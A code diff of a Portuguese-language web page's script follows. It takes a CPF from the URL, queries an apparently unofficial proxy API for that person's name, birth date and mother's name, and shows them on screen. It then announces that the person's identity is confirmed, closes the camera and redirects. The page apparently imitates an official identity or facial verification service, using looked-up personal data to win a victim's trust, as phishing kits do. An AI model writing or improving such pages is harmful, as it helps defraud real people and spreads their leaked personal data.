-      await dizer('Identidade confirmada com sucesso.', 'ok');
-      await delay(1200);
+      dizer('Identidade confirmada com sucesso.', 'ok');
+      await delay(3000);
+      fecharCamera();
       redirecionar();
     }
 
@@ -733,57 +564,41 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       const params = new URLSearchParams(window.location.search);
       const cpf    = params.get('cpf');
 
-      /* CPF obrigatório — fica na tela de loading sem ele */
-      if (!cpf || cpf.replace(/\D/g, '').length < 11) {
+      if (!cpf || cpf.replace(/\D/g,'').length < 11) {
         const check = setInterval(() => {
           const c = new URLSearchParams(window.location.search).get('cpf');
-          if (c && c.replace(/\D/g, '').length === 11) {
-            clearInterval(check);
-            fetchUserData();
+          if (c && c.replace(/\D/g,'').length === 11) {
+            clearInterval(check); fetchUserData();
           }
         }, 2000);
         return;
       }
 
       try {
-      const cleanCPF   = cpf.replace(/\D/g, '');
+        const cleanCPF   = cpf.replace(/\D/g,'');
         const controller = new AbortController();
         const t          = setTimeout(() => controller.abort(), 10000);
-
-        const res  = await fetch(
+        const res        = await fetch(
           `https://proxy-ativo.vercel.app/api/proxy?cpf=${cleanCPF}`,
           { signal: controller.signal }
         );
         clearTimeout(t);
-
         if (!res.ok) throw new Error('api error');
         const json = await res.json();
         const d    = json.dadosBasicos;
         if (!d || !d.nome) throw new Error('sem dados');
-
-        userData = {
-          nome:       d.nome       || '',
-          cpf:        d.cpf        || cleanCPF,
-          nascimento: d.nascimento || '',
-          mae:        d.mae        || ''
-        };
-
+        userData = { nome:d.nome||'', cpf:d.cpf||cleanCPF, nascimento:d.nascimento||'', mae:d.mae||'' };
         const nomeOk = formatarNome(userData.nome);
         elHdrName.textContent         = nomeOk.split(' ')[0];
         $('name-value').textContent   = nomeOk;
-        $('cpf-value').textContent    = formatarCPF(userData.cpf || cleanCPF);
+        $('cpf-value').textContent    = formatarCPF(userData.cpf||cleanCPF);
         $('birth-value').textContent  = userData.nascimento;
-        $('mother-value').textContent = userData.mae
-          ? formatarNome(userData.mae) : 'Não Informado';
-
-      } catch (e) {
+        $('mother-value').textContent = userData.mae ? formatarNome(userData.mae) : 'Não Informado';
+      } catch(e) {
         console.error('fetchUserData:', e);
-        /* mesmo com erro na API, continua com CPF parcial */
-        const cleanCPF = cpf.replace(/\D/g, '');
-        userData = { nome: '', cpf: cleanCPF, nascimento: '', mae: '' };
+        userData = { nome:'', cpf:cpf.replace(/\D/g,''), nascimento:'', mae:'' };
       }
 
-      /* libera a página */
       elLoading.classList.add('hidden');
       elMain.classList.remove('hidden');
       iniciar();
